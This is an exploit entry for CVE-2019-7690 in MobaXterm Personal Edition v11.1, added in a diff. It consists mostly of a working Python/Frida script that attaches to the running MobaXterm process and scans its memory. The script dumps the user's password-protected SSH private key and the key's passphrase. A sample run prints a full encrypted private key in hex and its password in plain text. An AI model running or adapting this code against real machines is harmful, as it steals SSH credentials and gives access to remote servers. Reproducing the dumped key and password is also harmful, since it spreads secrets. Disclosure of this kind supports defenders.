@@ -1,0 +1,223 @@
+## Exploit Title: Sensitive Information Leak/Disclosure - Leaking SSH Private Key(Password Protected) and of its Password in Memory.
+## Date: 2019-02-10
+## Exploit Author: Yogesh Shelke (Twitter: https://twitter.com/y0gesh_she1ke)
+## Vendor Homepage: https://mobaxterm.mobatek.net
+## Software Link: https://download.mobatek.net/1112019010310554/MobaXterm_Installer_v11.1.zip
+## Version: MobaTek MobaXTerm Personal Edition v11.1 Build 3860
+## Tested On: Microsoft Windows 10 Pro
+## CVE: CVE-2019-7690
+#
+## Product Description: MobaXterm is ultimate toolbox for remote computing. In a single Windows application, it provides
+#                      loads of functions that are tailored for programmers, webmasters, IT administrators and pretty
+#                      much all users who need to handle their remote jobs in a more simple fashion. MobaXterm is being
+#                      used by many companies worldwide, for various business types including aeronautics, space,
+#                      defense, health, bank, network equipment, software, insurance, but also by government and
+#                      educational institutions (universities, high schools).
+#
+## Vulnerability Description: MobaXterm leaks ssh private key (password protected) and its password in MobaXterms process
+#                            memory to an attacker, once when victim logs in to remote server using passwordless ssh authentication.
+#                            Attacker can dump or steal SSH private key and its password as long as process runs, even after
+#                            user disconnects from remote server.
+## Exploit:
+
+import argparse
+import frida
+
+def on_message(message, data):
+    print "[%s] -> %s" % (message, data)
+
+
+def main(pid):
+    print "[+] Attaching to PID: %d" % pid
+    session = frida.attach(pid)
+    script = session.create_script("""
+        var pvt_key_passwd = '2e 70 70 6b 7c';
+        var pvt_key = '73 73 68 2d 72 73 61 0d 0a';
+        var memRanges = Process.enumerateRanges({protection: 'rw-'}, {
+            onMatch: function(range){
+                sc_mem(range.base, range.size, pvt_key, 0);
+                sc_mem(range.base, range.size, pvt_key_passwd, 1);
+                console.log('[+] Base Address: ' + range.base);
+                console.log('[+] Size: ' + range.size);
+                console.log('[+] Protection: ' + range.protection);
+            },
+            onComplete: function(){
+                console.log("[+] Mapped memory scan done!!");
+            }
+        });   
+        function sc_mem(addr, size, pattern, i){
+            Memory.scan(ptr(addr), size, pattern, {
+                onMatch: function(address, size){
+                    console.log('[+] Pattern found at: ' + address.toString());
+                    console.log('[+] Size: ' + size.toString());
+                    if (i==0){
+                        var buf = Memory.readByteArray(address, 0x800);
+                        console.log('+++++++++++++++++++++++ SSH Private Key(Password Protected) +++++++++++++++++++++++');
+                        console.log(hexdump(buf, {
+                            offset: 0,
+                            length: 2048,
+                            header: true,
+                            ansi: false
+                        }));                
+                    }else{
+                        var buf = Memory.readByteArray(ptr(address-0x20), 0x40);
+                        console.log('+++++++++++++++++++++++++++++ SSH Private Key Password ++++++++++++++++++++++++++++++');
+                        console.log(hexdump(buf, {
+                            offset: 0,
+                            length: 48,
+                            header: true,
+                            ansi: false
+                        }));   
+                        console.log('+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++');       
+                    }
+                }, 
+                onError: function(reason){
+                    console.log('[!] There was an error scanning memory');
+                }, 
+                onComplete: function(){
+                    //console.log('[!] Done!!');
+                    wait(6000);                
+                }
+            });
+        }
+        
+        function wait(mscs){
+            var now = new Date().getTime();
+            while(new Date().getTime() < now + mscs){
+                return;
+            }
+        }
+    """)
+    script.on('message', on_message)
+    script.load()
+    session.detach()
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--pid", help="Process PID", type=int)
+    args = parser.parse_args()
+    try:
+        pid = args.pid
+        main(pid)
+    except:
+        print '\n[!] Some error occurred!\n[!] usage: mobaxterm_exploit.py [-h] [-p]'
+
+## Exploit PoC:
+#   E:\mobaxterm>python mobaxterm_exploit.py --pid 150292
+#   [+] Attaching to PID: 150292
+#   [+] Base Address: 0x10000
+#   [+] Size: 65536
+#   [+] Protection: rw-
+#   [+] Base Address: 0x20000
+#   [+] Size: 8192
+#   [+] Protection: rw-
+#   ..
+#   ..
+#   ..
+#   ..
+#   [+] Mapped memory scan done!!
+#   [+] Pattern found at: 0x318ff0f
+#   [+] Size: 9
+#   +++++++++++++++++++++++ SSH Private Key(Password Protected) +++++++++++++++++++++++
+#              0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
+#   00000000  73 73 68 2d 72 73 61 0d 0a 45 6e 63 72 79 70 74  ssh-rsa..Encrypt
+#   00000010  69 6f 6e 3a 20 61 65 73 32 35 36 2d 63 62 63 0d  ion: aes256-cbc.
+#   00000020  0a 43 6f 6d 6d 65 6e 74 3a 20 63 6f 72 70 6f 72  .Comment: corpor
+#   00000030  61 74 65 5f 72 73 65 72 76 65 72 0d 0a 50 75 62  ate_rserver..Pub
+#   00000040  6c 69 63 2d 4c 69 6e 65 73 3a 20 36 0d 0a 41 41  lic-Lines: 6..AA
+#   00000050  41 41 42 33 4e 7a 61 43 31 79 63 32 45 41 41 41  AAB3NzaC1yc2EAAA
+#   00000060  41 42 4a 51 41 41 41 51 45 41 69 4f 2b 34 67 33  ABJQAAAQEAiO+4g3
+#   00000070  6d 52 4c 53 63 54 63 72 2f 4b 32 61 74 64 5a 57  mRLScTcr/K2atdZW
+#   00000080  44 47 6e 74 59 47 39 6e 4f 6c 35 44 43 33 0d 0a  DGntYG9nOl5DC3..
+#   00000090  4d 30 34 38 4a 63 78 6e 34 70 42 59 78 73 68 62  M048Jcxn4pBYxshb
+#   000000a0  4a 48 41 73 52 39 70 73 56 48 42 74 47 45 56 37  JHAsR9psVHBtGEV7
+#   000000b0  75 70 78 73 33 2f 74 6d 7a 61 2f 51 4d 4c 38 6c  upxs3/tmza/QML8l
+#   000000c0  55 6a 61 54 72 6f 76 43 33 4f 54 42 65 73 37 73  UjaTrovC3OTBes7s
+#   000000d0  0d 0a 6c 59 7a 37 50 73 65 55 43 32 64 69 64 2b  ..lYz7PseUC2did+
+#   000000e0  52 4f 2b 44 58 49 7a 58 52 52 62 61 4b 43 68 4e  RO+DXIzXRRbaKChN
+#   000000f0  64 49 35 39 37 45 6f 71 64 7a 76 72 79 2f 30 6a  dI597Eoqdzvry/0j
+#   00000100  75 74 76 76 52 78 78 76 64 63 47 62 35 4b 47 6e  utvvRxxvdcGb5KGn
+#   00000110  6d 6e 0d 0a 56 37 49 58 4b 53 33 48 4a 44 4f 69  mn..V7IXKS3HJDOi
+#   00000120  53 52 6b 45 68 76 79 68 44 41 4b 4c 6b 33 4e 6e  SRkEhvyhDAKLk3Nn
+#   00000130  55 70 58 62 7a 53 34 4b 77 2b 56 2b 31 57 61 2f  UpXbzS4Kw+V+1Wa/
+#   00000140  59 43 66 74 39 66 75 64 57 64 42 6f 61 46 6e 45  YCft9fudWdBoaFnE
+#   00000150  2f 66 65 44 0d 0a 6c 6c 56 4a 37 31 39 49 69 48  /feD..llVJ719IiH
+#   00000160  63 57 4c 38 56 5a 39 6c 2b 72 57 57 73 31 75 7a  cWL8VZ9l+rWWs1uz
+#   00000170  54 48 35 73 39 6f 39 58 6d 6b 46 61 30 39 77 50  TH5s9o9XmkFa09wP
+#   00000180  68 55 4d 64 56 67 77 67 43 65 79 45 49 2b 50 38  hUMdVgwgCeyEI+P8
+#   00000190  4a 57 66 6d 69 70 0d 0a 45 6a 58 65 52 6a 68 55  JWfmip..EjXeRjhU
+#   000001a0  67 76 67 4f 4a 67 2f 38 68 4c 65 32 2f 64 47 4c  gvgOJg/8hLe2/dGL
+#   000001b0  49 31 73 49 52 2f 62 6b 50 35 50 6c 48 46 4b 43  I1sIR/bkP5PlHFKC
+#   000001c0  69 44 31 2b 76 5a 4d 6e 2f 51 3d 3d 0d 0a 50 72  iD1+vZMn/Q==..Pr
+#   000001d0  69 76 61 74 65 2d 4c 69 6e 65 73 3a 20 31 34 0d  ivate-Lines: 14.
+#   000001e0  0a 43 6a 69 75 63 49 68 42 5a 77 77 73 6a 70 49  .CjiucIhBZwwsjpI
+#   000001f0  73 4d 36 6b 6c 6f 6b 74 4f 4e 48 4b 77 4d 68 52  sM6kloktONHKwMhR
+#   00000200  43 50 37 72 43 56 4f 77 48 76 44 45 54 2f 79 6b  CP7rCVOwHvDET/yk
+#   00000210  53 31 2b 44 32 4f 47 33 75 69 65 47 7a 30 6f 42  S1+D2OG3uieGz0oB
+#   00000220  38 0d 0a 76 6e 66 65 79 42 61 63 36 46 55 72 31  8..vnfeyBac6FUr1
+#   00000230  47 5a 39 45 34 65 77 61 36 4e 39 4d 36 6d 69 6b  GZ9E4ewa6N9M6mik
+#   00000240  45 55 56 30 78 39 6c 71 4f 5a 53 4d 51 2f 48 4c  EUV0x9lqOZSMQ/HL
+#   00000250  6c 51 6b 42 43 5a 42 75 72 39 45 48 32 66 75 61  lQkBCZBur9EH2fua
+#   00000260  71 55 2b 0d 0a 37 75 65 2b 42 47 73 70 76 5a 45  qU+..7ue+BGspvZE
+#   00000270  6b 37 5a 70 76 6a 51 74 38 55 6d 52 54 39 4a 44  k7ZpvjQt8UmRT9JD
+#   00000280  73 56 73 6b 4e 47 4b 43 6c 57 75 73 7a 6a 53 46  sVskNGKClWuszjSF
+#   00000290  33 71 48 41 50 54 41 56 77 5a 75 47 6f 38 68 72  3qHAPTAVwZuGo8hr
+#   000002a0  53 31 78 2f 66 0d 0a 71 34 4b 4b 41 6a 72 76 31  S1x/f..q4KKAjrv1
+#   000002b0  43 78 55 38 66 78 61 68 70 75 33 32 58 37 55 31  CxU8fxahpu32X7U1
+#   000002c0  65 32 5a 52 4f 55 53 6a 6e 78 67 46 39 56 71 57  e2ZROUSjnxgF9VqW
+#   000002d0  34 36 69 77 4f 2b 31 73 66 34 47 41 75 52 43 49  46iwO+1sf4GAuRCI
+#   000002e0  37 69 55 4d 61 65 6a 0d 0a 42 4e 35 63 46 6c 77  7iUMaej..BN5cFlw
+#   000002f0  34 58 47 6a 74 49 31 52 4a 6c 4f 6d 34 75 50 47  4XGjtI1RJlOm4uPG
+#   00000300  57 6c 4b 50 6b 67 46 63 74 66 4f 45 58 49 57 70  WlKPkgFctfOEXIWp
+#   00000310  6d 43 32 45 6c 5a 32 47 35 44 52 63 6e 38 4e 63  mC2ElZ2G5DRcn8Nc
+#   00000320  73 4c 63 53 56 4f 52 63 6d 0d 0a 52 4e 6a 57 78  sLcSVORcm..RNjWx
+#   00000330  64 6d 47 46 35 36 4a 75 35 34 52 31 6c 37 76 73  dmGF56Ju54R1l7vs
+#   00000340  42 6e 47 6f 6c 71 4e 35 69 4a 65 4b 48 35 4b 41  BnGolqN5iJeKH5KA
+#   00000350  4e 43 54 4f 4d 46 6a 47 2b 34 7a 4a 34 6d 6c 74  NCTOMFjG+4zJ4mlt
+#   00000360  57 70 6d 5a 72 38 41 61 51 2f 39 0d 0a 47 70 6d  WpmZr8AaQ/9..Gpm
+#   00000370  49 34 79 39 69 45 57 51 5a 39 61 2f 30 51 57 44  I4y9iEWQZ9a/0QWD
+#   00000380  76 6b 42 38 30 32 50 39 42 43 68 57 31 66 4c 6c  vkB802P9BChW1fLl
+#   00000390  76 4c 75 79 7a 4a 4f 2b 4a 61 75 5a 45 44 72 33  vLuyzJO+JauZEDr3
+#   000003a0  57 57 30 63 52 69 68 2b 44 6f 63 71 76 0d 0a 65  WW0cRih+Docqv..e
+#   000003b0  36 35 44 45 48 6e 38 52 56 4d 6b 65 34 49 2f 63  65DEHn8RVMke4I/c
+#   000003c0  6b 46 2f 68 59 6d 77 56 62 71 45 79 46 54 73 31  kF/hYmwVbqEyFTs1
+#   000003d0  75 37 58 33 6e 4c 37 6e 6b 75 76 6a 36 71 44 61  u7X3nL7nkuvj6qDa
+#   000003e0  43 38 42 61 37 5a 74 6a 4a 2b 71 70 47 34 44 0d  C8Ba7ZtjJ+qpG4D.
+#   000003f0  0a 31 65 31 78 64 39 39 6a 66 39 75 6b 6f 4d 4d  .1e1xd99jf9ukoMM
+#   00000400  75 5a 64 55 45 74 65 75 75 66 30 32 47 34 43 4f  uZdUEteuuf02G4CO
+#   00000410  56 6f 49 39 43 44 78 4c 38 2f 64 78 59 36 46 79  VoI9CDxL8/dxY6Fy
+#   00000420  50 6d 6b 69 59 38 47 70 45 4b 43 34 31 48 6b 44  PmkiY8GpEKC41HkD
+#   00000430  37 0d 0a 63 45 74 53 75 2f 48 30 4e 4b 52 6a 58  7..cEtSu/H0NKRjX
+#   00000440  4f 71 31 6e 77 72 61 59 39 47 4c 59 30 65 64 74  Oq1nwraY9GLY0edt
+#   00000450  57 42 64 46 68 57 45 6a 72 2f 4b 6d 4d 73 47 64  WBdFhWEjr/KmMsGd
+#   00000460  47 4e 59 30 46 68 51 4d 47 41 48 38 4c 35 70 42  GNY0FhQMGAH8L5pB
+#   00000470  4d 68 78 0d 0a 66 61 48 57 36 6b 45 71 58 53 2f  Mhx..faHW6kEqXS/
+#   00000480  68 37 76 73 73 4f 69 55 31 36 47 46 6e 74 52 4c  h7vssOiU16GFntRL
+#   00000490  62 71 41 69 6e 50 32 5a 4f 42 70 30 44 46 36 61  bqAinP2ZOBp0DF6a
+#   000004a0  78 62 2f 7a 4b 30 35 64 62 71 5a 54 46 47 4b 41  xb/zK05dbqZTFGKA
+#   000004b0  38 76 57 55 7a 0d 0a 4e 6b 69 4d 47 39 69 75 45  8vWUz..NkiMG9iuE
+#   000004c0  37 54 47 4d 53 36 4c 41 4e 62 32 64 78 6a 69 63  7TGMS6LANb2dxjic
+#   000004d0  67 37 75 6d 62 75 55 32 6d 4d 66 6a 34 52 79 75  g7umbuU2mMfj4Ryu
+#   000004e0  2f 6e 57 32 63 71 67 73 6b 69 58 57 5a 59 41 6d  /nW2cqgskiXWZYAm
+#   000004f0  2f 76 39 68 6e 57 64 0d 0a 4e 62 44 31 64 62 53  /v9hnWd..NbD1dbS
+#   00000500  34 6f 75 2b 41 34 4e 39 31 7a 73 72 34 77 4c 6c  4ou+A4N91zsr4wLl
+#   00000510  6e 55 56 2b 38 33 37 4e 58 46 64 46 75 2b 58 67  nUV+837NXFdFu+Xg
+#   00000520  4d 31 5a 49 55 34 47 76 66 77 52 57 59 67 50 61  M1ZIU4GvfwRWYgPa
+#   00000530  4e 72 49 55 4d 41 31 5a 44 0d 0a 4b 61 66 73 41  NrIUMA1ZD..KafsA
+#   00000540  50 58 46 73 73 2f 75 4b 4c 2b 74 78 53 75 48 5a  PXFss/uKL+txSuHZ
+#   00000550  77 6d 33 78 5a 34 79 51 4c 78 6b 72 70 4d 7a 53  wm3xZ4yQLxkrpMzS
+#   00000560  4f 65 31 4b 73 75 46 45 52 6a 79 36 64 54 59 70  Oe1KsuFERjy6dTYp
+#   00000570  79 72 75 76 61 34 53 30 67 59 5a 0d 0a 50 72 69  yruva4S0gYZ..Pri
+#   00000580  76 61 74 65 2d 4d 41 43 3a 20 31 30 31 35 62 30  vate-MAC: 1015b0
+#   00000590  34 38 38 65 39 31 63 31 63 62 32 33 64 64 64 66  488e91c1cb23dddf
+#   000005a0  36 63 61 33 31 31 31 62 35 65 32 31 34 37 61 37  6ca3111b5e2147a7
+#   000005b0  37 36 0d 0a 00 00 00 00 00 00 00 00 00 00 00 00  76..............
+#   [+] Pattern found at: 0x61ca4db
+#   [+] Size: 5
+#   +++++++++++++++++++++++++++++ SSH Private Key Password ++++++++++++++++++++++++++++++
+#           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
+#   00000000  00 c0 60 1c 06 01 00 00 00 23 00 00 00 65 3a 5c  ..`......#...e:\
+#   00000010  74 65 73 74 5c 70 72 69 76 61 74 65 5f 6b 65 79  test\private_key
+#   00000020  2e 70 70 6b 7c 57 65 6c 63 6f 6d 65 40 31 32 33  .ppk|Welcome@123
+#   +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ 
